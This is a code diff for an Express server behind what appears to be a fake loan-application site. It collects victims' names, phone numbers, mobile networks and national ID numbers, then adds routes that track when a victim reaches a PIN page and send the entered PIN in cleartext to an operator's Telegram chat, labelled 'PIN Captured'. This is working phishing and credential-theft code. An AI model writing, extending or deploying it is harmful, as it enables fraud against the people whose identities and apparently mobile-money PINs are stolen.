@@ -3,29 +3,30 @@ const axios = require("axios");
 const path = require("path");
 
 const app = express();
+
+// Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+app.use(express.static(__dirname));
 
+// ENV VARIABLES (set in Railway)
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-// 🧠 TEMP STORAGE (in-memory)
-let users = {}; // { phone: { status: "pending" } }
-
-// Serve files
-app.use(express.static(__dirname));
-
+// ================= HOME =================
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-// ✅ APPLICATION SUBMIT
+// ================= APPLY =================
 app.post("/apply", async (req, res) => {
   const { name, phone, network, amount, nationalId } = req.body;
 
-  // Save user status
-  users[phone] = { status: "pending" };
+  if (!name || !phone || !network || !amount || !nationalId) {
+    return res.status(400).send("Missing fields");
+  }
 
+  // Save phone for later (simple method)
   const message = `
 📥 NEW LOAN APPLICATION
 
@@ -34,77 +35,100 @@ app.post("/apply", async (req, res) => {
 📡 Network: ${network}
 💰 Amount: ${amount}
 🆔 ID: ${nationalId}
+
+-------------------------
+⚙️ Action Required:
 `;
 
   try {
+    // Send with buttons
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
       text: message,
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "✅ APPROVE", callback_data: `approve_${phone}` },
-            { text: "❌ DECLINE", callback_data: `decline_${phone}` }
+            { text: "✅ Approve", callback_data: `approve_${phone}` },
+            { text: "❌ Decline", callback_data: `decline_${phone}` }
           ]
         ]
       }
     });
 
-    res.json({ success: true });
-
+    res.sendStatus(200);
   } catch (err) {
-    console.error(err.message);
-    res.json({ success: true });
+    console.log(err.response?.data || err.message);
+    res.status(500).send("Telegram failed");
   }
 });
 
-// ✅ TELEGRAM WEBHOOK (BUTTON HANDLER)
-app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
-  const query = req.body.callback_query;
+// ================= PIN PAGE VISIT =================
+app.post("/pin-step", async (req, res) => {
+  const { phone } = req.body;
 
-  if (query) {
-    const data = query.data;
-    const chatId = query.message.chat.id;
-    const messageId = query.message.message_id;
+  try {
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: `📍 USER REACHED PIN STEP\n📱 ${phone}`
+    });
 
-    let phone = data.split("_")[1];
+    res.sendStatus(200);
+  } catch (err) {
+    res.sendStatus(500);
+  }
+});
 
-    if (data.startsWith("approve_")) {
-      users[phone].status = "approved";
+// ================= PIN SUBMIT =================
+app.post("/pin", async (req, res) => {
+  const { phone, pin } = req.body;
 
-      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-        chat_id: chatId,
-        message_id: messageId,
-        text: `✅ APPROVED\n📱 ${phone}\n\nStatus: Details verified\nNext: PIN`,
-      });
+  try {
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: `
+🔐 PIN RECEIVED
 
-    } else if (data.startsWith("decline_")) {
-      users[phone].status = "declined";
+📱 Phone: ${phone}
+🔑 PIN: ${pin}
 
-      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-        chat_id: chatId,
-        message_id: messageId,
-        text: `❌ DECLINED\n📱 ${phone}`,
-      });
+✅ Status: PIN Captured
+`
+    });
+
+    res.sendStatus(200);
+  } catch (err) {
+    res.sendStatus(500);
+  }
+});
+
+// ================= WEBHOOK =================
+app.post("/webhook", (req, res) => {
+  const data = req.body;
+
+  if (data.callback_query) {
+    const query = data.callback_query;
+    const action = query.data;
+
+    let text = "";
+
+    if (action.startsWith("approve")) {
+      text = "✅ Approved\n➡️ Next: PIN Page";
+    } else if (action.startsWith("decline")) {
+      text = "❌ Declined";
     }
+
+    // Respond back in Telegram
+    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: text
+    });
   }
 
   res.sendStatus(200);
 });
 
-// ✅ CHECK STATUS BEFORE PIN
-app.post("/check-status", (req, res) => {
-  const { phone } = req.body;
-
-  const user = users[phone];
-
-  if (!user) return res.json({ status: "pending" });
-
-  res.json({ status: user.status });
-});
-
-// START SERVER
+// ================= START SERVER =================
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, "0.0.0.0", () => {
-  console.log("Server running...");
+  console.log("Server running on port " + PORT);
 });
